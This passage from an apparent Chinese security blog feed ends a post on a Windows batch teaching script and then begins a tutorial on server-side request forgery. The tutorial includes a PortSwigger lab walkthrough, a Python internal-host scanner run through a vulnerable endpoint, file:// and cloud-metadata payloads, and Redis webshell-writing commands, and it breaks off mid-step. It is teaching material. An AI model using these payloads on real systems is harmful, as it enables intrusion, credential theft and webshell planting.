class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">:: ===== 修复：移除有问题的Unicode检测代码 =====</span><br><span class="line">:: 只保留必要的编码设置</span><br><span class="line">chcp 65001 &gt;nul</span><br><span class="line">title Batch 脚本教学工具 - 修复版</span><br><span class="line"></span><br><span class="line">:: ===== 添加暂停以确保窗口保持打开 =====</span><br><span class="line">echo 正在初始化...</span><br><span class="line">timeout /t 1 &gt;nul</span><br><span class="line"></span><br><span class="line">:: ===== 简化的主菜单 =====</span><br><span class="line">:MENU</span><br><span class="line">cls</span><br><span class="line">echo.</span><br><span class="line">echo ================================</span><br><span class="line">echo     Batch 脚本教学工具</span><br><span class="line">echo ================================</span><br><span class="line">echo [1] 显示系统信息</span><br><span class="line">echo [2] 文件操作演示</span><br><span class="line">echo [3] 网络测试</span><br><span class="line">echo [4] 退出</span><br><span class="line">echo ================================</span><br><span class="line"></span><br><span class="line">:: 使用更稳定的选择方式</span><br><span class="line">set /p choice=请选择功能 (1-4): </span><br><span class="line"></span><br><span class="line">if &quot;%choice%&quot;==&quot;1&quot; goto INFO</span><br><span class="line">if &quot;%choice%&quot;==&quot;2&quot; goto FILES</span><br><span class="line">if &quot;%choice%&quot;==&quot;3&quot; goto NETWORK</span><br><span class="line">if &quot;%choice%&quot;==&quot;4&quot; exit</span><br><span class="line"></span><br><span class="line">echo 输入无效，请重新选择</span><br><span class="line">pause</span><br><span class="line">goto MENU</span><br><span class="line"></span><br><span class="line">:INFO</span><br><span class="line">cls</span><br><span class="line">echo.</span><br><span class="line">echo ===== 系统信息 =====</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 使用更兼容的命令获取系统信息</span><br><span class="line">echo 操作系统信息:</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; /C:&quot;系统类型&quot;</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo 计算机名称: %COMPUTERNAME%</span><br><span class="line">echo 用户名: %USERNAME%</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo 磁盘空间信息:</span><br><span class="line">for /f &quot;skip=1&quot; %%d in (&#x27;wmic logicaldisk get caption,size,freespace&#x27;) do (</span><br><span class="line">    if not &quot;%%d&quot;==&quot;&quot; echo 驱动器 %%d</span><br><span class="line">)</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">pause</span><br><span class="line">goto MENU</span><br><span class="line"></span><br><span class="line">:FILES</span><br><span class="line">cls</span><br><span class="line">echo.</span><br><span class="line">echo ===== 文件操作演示 =====</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 显示当前目录文件</span><br><span class="line">echo 当前目录文件列表:</span><br><span class="line">dir /B</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 创建示例文件进行演示</span><br><span class="line">echo 正在创建示例文件...</span><br><span class="line">echo 这是示例文件1 &gt; sample1.txt</span><br><span class="line">echo 这是示例文件2 &gt; sample2.txt</span><br><span class="line">echo 这是示例文件3 &gt; sample3.txt</span><br><span class="line"></span><br><span class="line">echo 创建完成！新文件列表:</span><br><span class="line">dir /B *.txt</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 批量重命名演示</span><br><span class="line">set /a count=0</span><br><span class="line">for %%f in (*.txt) do (</span><br><span class="line">    set /a count+=1</span><br><span class="line">    ren &quot;%%f&quot; &quot;renamed_file_!count!.txt&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">echo 重命名后文件列表:</span><br><span class="line">dir /B *.txt</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 清理示例文件</span><br><span class="line">del *_file_*.txt</span><br><span class="line">echo 已清理示例文件</span><br><span class="line">pause</span><br><span class="line">goto MENU</span><br><span class="line"></span><br><span class="line">:NETWORK</span><br><span class="line">cls</span><br><span class="line">echo.</span><br><span class="line">echo ===== 网络测试 =====</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo 网络适配器信息:</span><br><span class="line">ipconfig | findstr IPv4</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">set /p host=请输入要测试的网址或IP(直接回车使用百度): </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if &quot;%host%&quot;==&quot;&quot; set host=www.baidu.com</span><br><span class="line"></span><br><span class="line">echo 正在ping测试...</span><br><span class="line">ping -n 3 %host%</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line">echo 网络测试完成</span><br><span class="line">pause</span><br><span class="line">goto MENU</span><br></pre></td></tr></table></figure><p>结果报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;wmic&#x27; is not recognized as an internal or external command,</span><br><span class="line">operable program or batch file</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>遇到的问题是因为在 Windows 11 22H2 及更高版本中，微软已弃用并移除了 WMIC 工具。让我提供一个完全兼容的修复版脚本，使用替代命令获取系统信息</p><p>修改后:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line">chcp 65001 &gt;nul</span><br><span class="line">title Batch 脚本教学工具 - 兼容版</span><br><span class="line"></span><br><span class="line">:: ===== 主菜单 =====</span><br><span class="line">:MENU</span><br><span class="line">cls</span><br><span class="line">echo.</span><br><span class="line">echo ================================</span><br><span class="line">echo     Batch 脚本教学工具</span><br><span class="line">echo ================================</span><br><span class="line">echo [1] 显示系统信息</span><br><span class="line">echo [2] 文件操作演示</span><br><span class="line">echo [3] 网络测试</span><br><span class="line">echo [4] 退出</span><br><span class="line">echo ================================</span><br><span class="line"></span><br><span class="line">set /p choice=请选择功能 (1-4): </span><br><span class="line"></span><br><span class="line">if &quot;%choice%&quot;==&quot;1&quot; goto INFO</span><br><span class="line">if &quot;%choice%&quot;==&quot;2&quot; goto FILES</span><br><span class="line">if &quot;%choice%&quot;==&quot;3&quot; goto NETWORK</span><br><span class="line">if &quot;%choice%&quot;==&quot;4&quot; exit</span><br><span class="line"></span><br><span class="line">echo 输入无效，请重新选择</span><br><span class="line">pause</span><br><span class="line">goto MENU</span><br><span class="line"></span><br><span class="line">:: ===== 系统信息 (不使用WMIC) =====</span><br><span class="line">:INFO</span><br><span class="line">cls</span><br><span class="line">echo.</span><br><span class="line">echo ===== 系统信息 =====</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 使用systeminfo获取基本信息</span><br><span class="line">echo 操作系统信息:</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; /C:&quot;系统类型&quot;</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo 计算机名称: %COMPUTERNAME%</span><br><span class="line">echo 用户名: %USERNAME%</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 使用powershell获取磁盘信息</span><br><span class="line">echo 磁盘空间信息:</span><br><span class="line">echo.</span><br><span class="line">for /f &quot;tokens=1,2,3&quot; %%a in (&#x27;powershell &quot;Get-CimInstance -ClassName Win32_LogicalDisk | Format-List DeviceID, Size, FreeSpace&quot; ^| findstr /v &quot;:&quot;&#x27;) do (</span><br><span class="line">    set &quot;drive=%%a&quot;</span><br><span class="line">    set &quot;size=%%b&quot;</span><br><span class="line">    set &quot;free=%%c&quot;</span><br><span class="line"></span><br><span class="line">    :: 转换为GB</span><br><span class="line">    set /a size_gb=!size!/1073741824</span><br><span class="line">    set /a free_gb=!free!/1073741824</span><br><span class="line"></span><br><span class="line">    echo 驱动器 !drive! - 总空间: !size_gb! GB, 可用空间: !free_gb! GB</span><br><span class="line">)</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">pause</span><br><span class="line">goto MENU</span><br><span class="line"></span><br><span class="line">:: ===== 文件操作演示 =====</span><br><span class="line">:FILES</span><br><span class="line">cls</span><br><span class="line">echo.</span><br><span class="line">echo ===== 文件操作演示 =====</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 显示当前目录文件</span><br><span class="line">echo 当前目录文件列表:</span><br><span class="line">dir /B</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 创建示例文件进行演示</span><br><span class="line">echo 正在创建示例文件...</span><br><span class="line">echo 这是示例文件1 &gt; sample1.txt</span><br><span class="line">echo 这是示例文件2 &gt; sample2.txt</span><br><span class="line">echo 这是示例文件3 &gt; sample3.txt</span><br><span class="line"></span><br><span class="line">echo 创建完成！新文件列表:</span><br><span class="line">dir /B *.txt</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 批量重命名演示</span><br><span class="line">set /a count=0</span><br><span class="line">for %%f in (*.txt) do (</span><br><span class="line">    set /a count+=1</span><br><span class="line">    ren &quot;%%f&quot; &quot;renamed_file_!count!.txt&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">echo 重命名后文件列表:</span><br><span class="line">dir /B *.txt</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">:: 清理示例文件</span><br><span class="line">del *_file_*.txt</span><br><span class="line">echo 已清理示例文件</span><br><span class="line">pause</span><br><span class="line">goto MENU</span><br><span class="line"></span><br><span class="line">:: ===== 网络测试 =====</span><br><span class="line">:NETWORK</span><br><span class="line">cls</span><br><span class="line">echo.</span><br><span class="line">echo ===== 网络测试 =====</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">echo 网络适配器信息:</span><br><span class="line">ipconfig | findstr IPv4</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">set /p host=请输入要测试的网址或IP(直接回车使用百度): </span><br><span class="line">if &quot;%host%&quot;==&quot;&quot; set host=www.baidu.com</span><br><span class="line"></span><br><span class="line">echo 正在ping测试...</span><br><span class="line">ping -n 3 %host%</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line">echo 网络测试完成</span><br><span class="line">pause</span><br><span class="line">goto MENU</span><br></pre></td></tr></table></figure><p>这篇文章会继续更新下去</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2025/09/SSRF/"/>
      <url>/2025/09/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF-服务端请求伪造"><a href="#SSRF-服务端请求伪造" class="headerlink" title="SSRF-服务端请求伪造"></a>SSRF-服务端请求伪造</h1><h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p>服务器端请求伪造是一个Web安全漏洞,允许攻击者导致服务器端应用程序向意外位置发出请求。</p><p>在典型的SSRF攻击中,攻击者可能导致服务器连接到组织基础设施内的仅内部服务。在其他情况下,他们可能能够迫使服务器连接到任意外部系统。这可能会泄露敏感数据,例如授权凭据。</p><h2 id="针对本地服务器的攻击"><a href="#针对本地服务器的攻击" class="headerlink" title="针对本地服务器的攻击"></a>针对本地服务器的攻击</h2><p>在针对服务器的SSRF攻击中,攻击者通过其循环回流网络接口,导致应用程序向托管应用程序的服务器发出HTTP请求。这通常涉及向URL提供像这样的主机名<code>127.0.0.1</code>(一个指向循环回转适配器的预留IP地址)或<code>localhost</code>(同一适配器常用的名称)。</p><p>例如,设想一个购物应用程序,允许用户查看某商品是否在特定商店中有库存。要提供库存信息,应用程序必须查询各种后端REST API。通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现。当用户查看商品的库存状态时,其浏览器会提出以下请求:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</span><br></pre></td></tr></table></figure><p>这导致服务器向指定的网址发出请求,重新找回股票状态,并将其归还给用户。</p><p>在此示例中,攻击者可以修改请求以指定服务器本地的 URL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure><p>服务器获取内容<code>/admin</code>URL 并将其返回给用户。</p><p>攻击者可以访问<code>/admin</code>URL,但管理功能通常仅对经过身份验证的用户开放。这意味着攻击者不会看到任何相关内容。但是,如果请求<code>/admin</code>URL 来自本地机器,常规访问控制被绕过。该应用程序授予对管理功能的完全访问权限,因为该请求似乎来自一个可信的位置。</p><h3 id="核心攻击流程​"><a href="#核心攻击流程​" class="headerlink" title="核心攻击流程​"></a>核心攻击流程​</h3><p>​漏洞入口​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">购物应用存在SSRF漏洞：前端允许用户通过stockApi参数指定后端API地址（http://stock.weliketoshop.net:8080/...），服务器会无条件访问该地址并返回内容。</span><br></pre></td></tr></table></figure><p>​攻击者篡改请求​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者将stockApi参数值改为服务器本地的管理接口：</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stockApi=http://localhost/admin</span><br><span class="line">localhost或 127.0.0.1指向服务器的回环接口（Loopback Adapter）​，即服务器自身。</span><br></pre></td></tr></table></figure><p>​服务器执行恶意请求​</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器收到请求后，向自己的http://localhost/admin发送请求，获取管理页面的内容（如HTML源码）。</span><br></pre></td></tr></table></figure><p>​绕过访问控制​</p><p>管理页面&#x2F;admin原本需要身份验证，但服务器设计时认为：</p><p>​​“来自本地的请求一定是可信的”​​</p><p>因此直接返回了敏感内容，攻击者无需登录即可获取管理功能。</p><h3 id="应用程序信任本地请求核心原因"><a href="#应用程序信任本地请求核心原因" class="headerlink" title="应用程序信任本地请求核心原因"></a>应用程序信任本地请求核心原因</h3><h4 id="访问控制分层失效（前置组件绕过）"><a href="#访问控制分层失效（前置组件绕过）" class="headerlink" title="访问控制分层失效（前置组件绕过）"></a>访问控制分层失效（前置组件绕过）</h4><ul><li><p>​<strong>典型架构</strong>​：<br>外部请求 → 防火墙&#x2F;WAF → 反向代理（如Nginx） → 应用服务器<br>​<strong>访问控制</strong>可能仅部署在反向代理层（例如Nginx配置<code>allow 127.0.0.1; deny all</code>）。</p></li><li><p>​<strong>漏洞根源</strong>​：<br>当应用服务器通过SSRF访问<code>localhost/admin</code>时，请求<strong>绕过反向代理</strong>，直接来自内部网络（源IP&#x3D;127.0.0.1）。<br>→ 反向代理的ACL规则失效，应用服务器未做二次验证。</p></li></ul><h4 id="灾难恢复后门（运维便利性陷阱"><a href="#灾难恢复后门（运维便利性陷阱" class="headerlink" title="灾难恢复后门（运维便利性陷阱)"></a>灾难恢复后门（运维便利性陷阱)</h4><ul><li><p>​<strong>设计初衷</strong>​：<br>管理员忘记密码时，可通过服务器本地执行命令紧急恢复系统（例如<code>curl http://localhost/resetAdminPassword</code>）。</p></li><li><p>​<strong>致命假设</strong>​：<br>“能物理登录服务器的人一定是可信管理员”。<br>→ 忽略<strong>网络层面</strong>的本地请求可能被伪造（SSRF）。</p></li></ul><h4 id="端口隔离​"><a href="#端口隔离​" class="headerlink" title="端口隔离​"></a>端口隔离​</h4><ul><li><p>​<strong>常见配置</strong>​：</p><ul><li><p>用户访问端口：<code>公网IP:80</code>（对外开放）</p></li><li><p>管理接口端口：<code>127.0.0.1:8080</code>（仅本地可访问）</p></li></ul></li></ul><h3 id="URL结构解析"><a href="#URL结构解析" class="headerlink" title="URL结构解析"></a>URL结构解析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URL = schema://[userinfo]@[host:port][path]?[query]#[fragment]</span><br><span class="line"># schema 资源所需要的协议</span><br><span class="line"># host 表示服务器,可以是域名,也可以是ipv4或者ipv6地址</span><br><span class="line"># port 表示端口</span><br><span class="line"># path 路径</span><br><span class="line"># query 查询字符串,将用户输入传递给服务器,例如?id = 1</span><br><span class="line"># fragment </span><br></pre></td></tr></table></figure><table><thead><tr><th>原始字符</th><th>编码后</th><th>说明</th></tr></thead><tbody><tr><td><code>:</code></td><td><code>%3A</code></td><td>冒号</td></tr><tr><td><code>/</code></td><td><code>%2F</code></td><td>斜杠</td></tr><tr><td><code>/</code></td><td><code>%2F</code></td><td>斜杠</td></tr><tr><td><code>/</code></td><td><code>%2F</code></td><td>斜杠</td></tr><tr><td><code>?</code></td><td><code>%3F</code></td><td>问号</td></tr><tr><td><code>=</code></td><td><code>%3D</code></td><td>等号</td></tr></tbody></table><h3 id="案例说明"><a href="#案例说明" class="headerlink" title="案例说明"></a>案例说明</h3><p><a href="https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/ssrf-apprentice/ssrf/lab-basic-ssrf-against-localhost#">靶场连接</a></p><p><a href="https://blog.csdn.net/m0_74412122/article/details/140991404?ops_request_misc=elastic_search_misc&request_id=89ca0823f729217e76d622d85489d1d5&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~ElasticSearch~search_v2-1-140991404-null-null.142^v102^pc_search_result_base3&utm_term=%E5%AE%9E%E9%AA%8C%E5%AE%A4%3A%E9%92%88%E5%AF%B9%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E7%A1%80SSRF&spm=1018.2226.3001.4187">  csdn靶场解析</a></p><h4 id="过程说明"><a href="#过程说明" class="headerlink" title="过程说明"></a>过程说明</h4><ul><li><p>首先观察具体商品页面存在查看库存的功能</p></li><li><p>抓包更改api接口为127.0.0.1&#x2F;admin,出现部分管理员页面,点击删除卡洛斯</p></li><li><p>抓包后发现url逻辑是<code>/damin/delete?username=carlos</code></p></li><li><p>再次对库存查找的功能抓包,修改api接口为以上的url</p></li></ul><h2 id="针对其他后端系统的攻击"><a href="#针对其他后端系统的攻击" class="headerlink" title="针对其他后端系统的攻击"></a>针对其他后端系统的攻击</h2><p>针对其他后端系统的SSRF攻击</p><p>在某些情况下,应用程序服务器能够与无法直接访问的后端系统进行交互。这些系统通常具有不可路由的私有IP地址。后端系统通常受到网络拓扑保护,因此其安全态势通常较弱。在许多情况下,内部后端系统包含一些敏感功能,任何能够与系统交互的人均可在无需身份验证的情况下访问。</p><p>在前面的示例中,假设后端URL处存在一个管理接口 <code>https://192.168.0.68/admin</code>。攻击者可以提交以下请求以利用SSRF漏洞,并访问管理界面</p><h3 id="检测服务器端口开放程度"><a href="#检测服务器端口开放程度" class="headerlink" title="检测服务器端口开放程度"></a>检测服务器端口开放程度</h3><h4 id="简单脚本探测端口及ip"><a href="#简单脚本探测端口及ip" class="headerlink" title="简单脚本探测端口及ip"></a>简单脚本探测端口及ip</h4><p>通过编写简单的脚本逐一试探服务器端口是否开放,通过返回true或者false来判断</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描192.168.1.0/24网段示例</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = <span class="string">f&quot;http://vulnerable-site.com/ssrf.php?url=http://192.168.1.<span class="subst">&#123;i&#125;</span>&quot;</span></span><br><span class="line">        response = requests.get(url, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;发现存活主机: 192.168.1.<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="检测漏洞存在"><a href="#检测漏洞存在" class="headerlink" title="检测漏洞存在"></a>检测漏洞存在</h4><p>尝试schema的协议类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:// # 从文件系统中获取文件</span><br><span class="line">dirt:// # 字典服务器协议</span><br><span class="line">gopher:// # 分布式文档传递</span><br></pre></td></tr></table></figure><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable-site.com/ssrf.php?url=file:///etc/hosts</span><br><span class="line">http://vulnerable-site.com/ssrf.php?url=file:///proc/net/route</span><br><span class="line">http://vulnerable-site.com/ssrf.php?url=file:///proc/net/arp</span><br></pre></td></tr></table></figure><p>利用服务器自身泄露的信息​<br>这是更高效的方法——让服务器告诉你它所在的内网环境​<br>：</p><p>​读取网络配置文件​：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看上文的schema</span><br></pre></td></tr></table></figure><p>​查看网络接口信息​：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable-site.com/ssrf.php?url=file:///proc/net/dev</span><br></pre></td></tr></table></figure><p>​3. 云环境特殊探测​<br>如果目标运行在云服务器上，攻击者会尝试访问云元数据接口​</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable-site.com/ssrf.php?url=http://169.254.169.254/</span><br><span class="line">http://vulnerable-site.com/ssrf.php?url=http://169.254.169.254/latest/meta-data/</span><br><span class="line">这个特殊地址（169.254.169.254）是云平台的标准元数据服务地址，可能泄露大量敏感信息包括内网IP。</span><br></pre></td></tr></table></figure><p>​4. 基于响应差异的探测​<br>即使没有直接回显（盲SSRF），攻击者仍能通过以下方式推断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​响应时间差异​：连接存活主机的响应通常比连接不存在IP更快</span><br><span class="line"></span><br><span class="line">​错误信息差异​：不同服务会返回不同的错误消息</span><br><span class="line"></span><br><span class="line">​DNS查询​：诱导服务器向攻击者控制的DNS服务器发起查询</span><br></pre></td></tr></table></figure><h3 id="使用gopher协议"><a href="#使用gopher协议" class="headerlink" title="使用gopher协议"></a>使用gopher协议</h3><h4 id="攻击redis"><a href="#攻击redis" class="headerlink" title="攻击redis"></a>攻击redis</h4><p>redis一般运行在内网,大多绑定在<strong>127.0.0.1:6379</strong>,一般空口令</p><h5 id="1-未授权访问与弱口令"><a href="#1-未授权访问与弱口令" class="headerlink" title="1. 未授权访问与弱口令"></a>1. 未授权访问与弱口令</h5><p>Redis 默认安装后<strong>没有密码认证</strong>​（<code>requirepass</code>参数为空），或者管理员设置了<strong>弱口令</strong>，导致攻击者可以直接连接</p><p>。</p><ul><li>​<strong>检测与连接</strong>​：<br> 使用 redis-cli 尝试连接，如果不需要密码即可进入交互式命令行，则存在未授权访问redis-cli -h &lt;目标IP&gt;# 如果设置了密码，可以尝试使用 hydra 进行暴力破解hydra -P &#x2F;path&#x2F;to&#x2F;password_list.txt redis:&#x2F;&#x2F;&lt;目标IP&gt;</li></ul><h5 id="2-写入-Webshell"><a href="#2-写入-Webshell" class="headerlink" title="2. 写入 Webshell"></a>2. 写入 Webshell</h5><p>此方法需要在目标服务器上存在一个 Redis 进程有<strong>写入权限的 Web 目录</strong>​（如 <code>/var/www/html</code>）。</p><p>​<strong>利用步骤</strong>​：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#接至目标 Redisredis-cli -h &lt;目标IP&gt;</span><br><span class="line"># 配置 Redis 的持久化存储目录为 Web 目录</span><br><span class="line">目标IP:6379&gt; CONFIG SET dir /var/www/html</span><br><span class="line"># 设置持久化数据库文件名为一个 PHP 文件</span><br><span class="line">目标IP:6379&gt; CONFIG SET dbfilename shell.php</span><br><span class="line"># 写入一个简单的 PHP 